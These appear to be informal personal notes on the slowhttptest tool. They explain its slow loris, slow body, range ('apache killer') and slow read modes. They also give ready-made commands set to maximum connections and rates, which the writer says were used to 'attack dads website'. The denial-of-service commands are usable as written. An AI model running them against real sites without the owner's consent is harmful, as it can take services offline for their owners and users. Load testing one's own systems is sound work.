Tools and commands to use slowhttptest

so basically you will need to type this for everything you want to do

slowhttptest -(enter the test type you want) -u (enter the http:// address you
want to test)

this test will use the default of a slow loris attack aka it loads the header
info super slow.

If you want to use more commands these are the basics

\-H slow loris (Header file)

\-B slow body attack

\-R range attack aka apache killer

\-X slow reader

\-c the amount of connections, in this app the default is 50 and max is 65539

\-u the url address you want to stress test

\-r the rate at which connections are opened

\-l the amount of seconds the stress test will take place

\-k the amount of times the port is able to request back for the same info

Here are some shortcuts that I have pre designed

Slow read attack, attacks dads website, max amount of ports, length of ten
minutes, opens 600 ports a second. Seems to have very very minimal closed ports
on dads website.

slowhttptest -X -u http://website.com -c 65539 -l 600 -r 600

Body Attack, same as above but large amounts of ports lost even with the
increase in ports per second

slowhttptest -B -u http://website.com -c 65539 -l 600 -r 600

Header attack, minimal port loss but still not as good as slow reader

slowhttptest -H -u http://website -c 65539 -l 600 -r 600
